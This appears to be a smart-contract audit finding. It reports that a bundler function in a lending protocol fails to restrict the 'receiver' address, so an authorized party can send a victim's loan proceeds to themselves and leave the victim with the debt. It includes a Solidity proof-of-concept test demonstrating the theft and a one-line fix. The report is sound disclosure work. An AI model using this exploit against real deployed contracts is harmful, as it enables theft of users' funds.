### Title
Unconstrained `receiver` in `supplyCollateralAndSellWithUnitsTarget` allows authorized attacker to redirect victim's sellerAssets - (`src/periphery/MidnightBundles.sol`)

### Summary
`MidnightBundles.supplyCollateralAndSellWithUnitsTarget` accepts a caller-controlled `receiver` address and only checks that `msg.sender` is authorized by `taker`, but never enforces that `receiver` equals `taker` or `msg.sender`. An attacker who holds a Midnight authorization from the victim can supply their own collateral on the victim's behalf, force the victim to accrue debt by taking buy offers, and redirect all resulting `sellerAssets` to themselves, leaving the victim with debt and no loan tokens.

### Finding Description

**Exact code path:**

`src/periphery/MidnightBundles.sol` lines 117–169:

```
Line 127: require(taker == msg.sender || IMidnight(MIDNIGHT).isAuthorized(taker, msg.sender), Unauthorized());
``` [1](#0-0) 

This is the only guard. It confirms `msg.sender` (attacker) is authorized by `taker` (victim). It does **not** constrain `receiver`.

```
Lines 134–139: collateral pulled from msg.sender (attacker), supplied to taker (victim)
``` [2](#0-1) 

```
Line 154: take(..., taker=victim, receiverIfTakerIsSeller=address(this), ...)
``` [3](#0-2) 

Inside `Midnight.take`, because `offer.buy == true`, the receiver for `sellerAssets` is `receiverIfTakerIsSeller = address(this)` (the bundler): [4](#0-3) [5](#0-4) 

The bundler accumulates `filledSellerAssets`. Then:

```
Line 168: SafeTransferLib.safeTransfer(loanToken, receiver, filledSellerAssets - referralFeeAssets);
``` [6](#0-5) 

`receiver` is the raw attacker-supplied parameter — no check that it equals `taker` or `msg.sender`.

**Attacker inputs:**
- `taker = victim`
- `receiver = attacker`
- `collateralSupplies` = attacker's own collateral (pulled from `msg.sender`)
- `takes` = valid buy offers in the market

**Why existing checks fail:**
The authorization check at line 127 only verifies the caller's right to act on behalf of the taker. It says nothing about where the proceeds must go. The `Midnight.take` authorization check (`isAuthorized[taker][msg.sender]` at `Midnight.sol:346`) is satisfied because the victim authorized the bundler. Neither check constrains the `receiver` parameter of the bundler function. [7](#0-6) 

The same flaw exists identically in `supplyCollateralAndSellWithAssetsTarget` at line 307. [8](#0-7) 

### Impact Explanation

- Victim accrues `targetUnits` of debt on Midnight with zero loan tokens received.
- Attacker receives `filledSellerAssets` loan tokens that belong to the victim.
- Victim's position is collateralized by attacker-supplied collateral; the attacker can later allow the position to become unhealthy (e.g., by withdrawing collateral if they can, or simply waiting for price movement) and liquidate the victim, extracting the collateral they originally deposited plus any liquidation bonus.

### Likelihood Explanation

**Preconditions:**
1. Victim has authorized `MidnightBundles` on Midnight — a normal step for any user of the bundler.
2. Victim has authorized the attacker on Midnight — e.g., a trusted keeper, a co-signer, or a UI-prompted authorization.
3. At least one buy offer exists in the market.

All three are realistic in normal protocol usage. The attack is repeatable as long as both authorizations remain active and buy offers exist. The attacker needs only enough collateral tokens to supply (which they recover indirectly via the loan tokens received).

### Recommendation

Enforce that `receiver` is either the taker or the caller in both sell-side bundler functions:

```solidity
require(receiver == taker || receiver == msg.sender, Unauthorized());
```

Add this immediately after the existing authorization check at line 127 in `supplyCollateralAndSellWithUnitsTarget` and at the equivalent location in `supplyCollateralAndSellWithAssetsTarget`. [1](#0-0) [9](#0-8) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {MidnightBundlesTest} from "./MidnightBundlesTest.sol";
import {CollateralSupply, Take, TokenPermit, PermitKind} from "../src/periphery/interfaces/IMidnightBundles.sol";

contract ExploitReceiverRedirect is MidnightBundlesTest {
    function testAttackerRedirectsVictimSellerAssets() public {
        address attacker = makeAddr("attacker");
        address victim   = borrower;   // victim is the taker/seller

        uint256 units = 100e18;
        offers[0].maxUnits = units;   // buy offer from lender

        // Victim authorizes bundler (normal usage)
        vm.prank(victim);
        midnight.setIsAuthorized(address(midnightBundles), true, victim);

        // Victim authorizes attacker (e.g., trusted keeper)
        vm.prank(victim);
        midnight.setIsAuthorized(attacker, true, victim);

        // Attacker supplies collateral tokens for the exploit
        uint256 collateralAmt = _collateralAmount(0, units);
        deal(market.collateralParams[0].token, attacker, collateralAmt);
        vm.prank(attacker);
        ERC20(market.collateralParams[0].token).approve(address(midnightBundles), collateralAmt);

        CollateralSupply[] memory supplies = new CollateralSupply[](1);
        supplies[0] = CollateralSupply({
            collateralIndex: 0,
            assets: collateralAmt,
            permit: TokenPermit({kind: PermitKind.None, data: ""})
        });

        Take[] memory takes = new Take[](1);
        takes[0] = Take({offer: offers[0], units: units, ratifierData: hex""});

        uint256 attackerLoanBefore = loanToken.balanceOf(attacker);
        uint256 victimDebtBefore   = midnight.debtOf(id, victim);

        // Attacker calls with taker=victim, receiver=attacker
        vm.prank(attacker);
        midnightBundles.supplyCollateralAndSellWithUnitsTarget(
            units,
            0,
            victim,    // taker
            attacker,  // receiver — attacker-controlled, no check
            supplies,
            takes,
            0,
            address(0)
        );

        // Assertions
        assertGt(loanToken.balanceOf(attacker), attackerLoanBefore, "attacker received sellerAssets");
        assertEq(midnight.debtOf(id, victim), victimDebtBefore + units,  "victim accrued debt");
        assertEq(loanToken.balanceOf(victim), 0,                          "victim received nothing");
    }
}
```

**Expected assertions:**
- `attacker.loanToken balance > 0` — attacker received `filledSellerAssets`
- `victim.debt == units` — victim bears the full debt
- `victim.loanToken balance == 0` — victim received no compensation
